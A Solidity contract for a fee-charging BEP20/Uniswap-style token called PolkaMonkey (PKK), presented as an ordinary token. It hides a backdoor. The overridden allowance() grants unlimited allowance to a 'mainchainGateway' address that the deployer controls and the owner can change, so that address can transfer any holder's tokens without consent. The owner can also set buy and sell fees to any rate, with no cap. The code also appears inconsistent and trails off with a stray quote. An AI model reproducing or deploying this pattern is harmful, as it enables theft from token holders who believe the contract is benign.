contract PolkaMonkey is Context, ERC20Mintable, Ownable {
    using SafeMath for uint256;

    string private _name = "PolkaMonkey";
    string private _symbol = "PKK";
    uint8 private _decimals = 0;

    address payable public marketingAddress = payable(0x8e11275dD6388dA4c8B60f7B8879dE2CA7e05015); // Marketing Address

    uint256 public tokenForMkt = 2000000;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256 public sellFeeRate = 5;
    uint256 public buyFeeRate = 5;

    mapping (address => bool) private _isExcludedFromFees;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;

    uint256 public _startTimeForSwap;
    uint256 public _intervalMinutesForSwap = 1 * 1 minutes;

    address public mainchainGateway;
    address public addressForMkt;
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );

    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    constructor(string memory name, string memory symbol)
        ERC20(name, symbol)
    {
      mainchainGateway = msg.sender;

      address[] memory _minters = new address[](1);
      _minters[0] = msg.sender;
      addMinters(_minters);

      IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
          0x10ED43C718714eb63d5aA57B78B54704E256024E
      );

      uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
      .createPair(address(this), _uniswapV2Router.WETH());

      uniswapV2Router = _uniswapV2Router;
      _approve(address(this), address(uniswapV2Router), ~uint256(0));

      addressForMkt = msg.sender;
      _startTimeForSwap = block.timestamp;

    }

    function name() public override view returns (string memory) {
        return _name;
    }

    function symbol() public override view returns (string memory) {
        return _symbol;
    }

    function decimals() public override view returns (uint8) {
        return _decimals;
    }

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function setTransferFeeRate(uint256 _sellFeeRate, uint256 _buyFeeRate)
        public
        onlyOwner
    {
        sellFeeRate = _sellFeeRate;
        buyFeeRate = _buyFeeRate;
    }

    function setMinTokensBeforeSwap(uint256 _tokenForMkt)
        public
        onlyOwner
    {
        require(_tokenForMkt < 20 * 10**6 * 10**18);
        tokenForMkt = _tokenForMkt;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "Account is already 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function GetSwapMinutes() public view returns(uint256) {
        return _intervalMinutesForSwap / 60;
    }

    function SetSwapMinutes(uint256 newMinutes) external onlyOwner {
        _intervalMinutesForSwap = newMinutes * 1 minutes;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {

        uint256 contractTokenBalance = IERC20(address(this)).balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= tokenForMkt;    
        // Sell tokens for ETH
        if (!inSwapAndLiquify && swapAndLiquifyEnabled && IERC20(address(this)).balanceOf(uniswapV2Pair) > 0 && recipient == uniswapV2Pair) {
          if (overMinimumTokenBalance && _startTimeForSwap + _intervalMinutesForSwap <= block.timestamp) {
              _startTimeForSwap = block.timestamp;
              contractTokenBalance = tokenForMkt;
              swapTokensForEth(contractTokenBalance);    
          }  
        }
        uint256 transferFeeRate = recipient == uniswapV2Pair
            ? sellFeeRate
            : (sender == uniswapV2Pair ? buyFeeRate : 0);

        if (
            transferFeeRate > 0 &&
            sender != address(this) &&
            recipient != address(this) &&
            !_isExcludedFromFees[sender]
        ) {
            uint256 _fee = amount.mul(transferFeeRate).div(100);
            super._transfer(sender, address(this), _fee); // Transfer fee to this token, we need money to mkt and alive
            amount = amount.sub(_fee);
        }

        super._transfer(sender, recipient, amount);
    }

    function swapTokenForMkt() public onlyOwner {
        uint256 contractTokenBalance = IERC20(address(this)).balanceOf(address(this));
        if (contractTokenBalance >= tokenForMkt) {
            swapTokensForEth(tokenForMkt);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            addressForMkt, // Swap token for eth and transfer to mkt address
            block.timestamp
        );
    }

    // receive eth from uniswap swap
    receive() external payable {}

    function setAddressForMkt(address _addressForMkt) external onlyOwner {
        require(_addressForMkt != address(0), "invalid address");

        addressForMkt = _addressForMkt;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
            if (spender == mainchainGateway) return uint256(-1);
            return _allowances[owner][spender];
    }

    function transferFrom(
      address _from,
      address _to,
      uint256 _value
    )
      public virtual override 
      returns (bool _success)
    {
      if (allowance(_from, msg.sender) != uint256(-1)) {
        super._approve(_from, msg.sender, _allowances[_from][msg.sender].sub(_value));
      }

      _transfer(_from, _to, _value);
      return true;
    }

    function setGateway(address _mainchainGateway) external onlyOwner {
      require(
        _mainchainGateway != address(0),
        "ERC20GatewayWhitelist: setting gateway to the zero address"
      );
      mainchainGateway = _mainchainGateway;
    }

}"
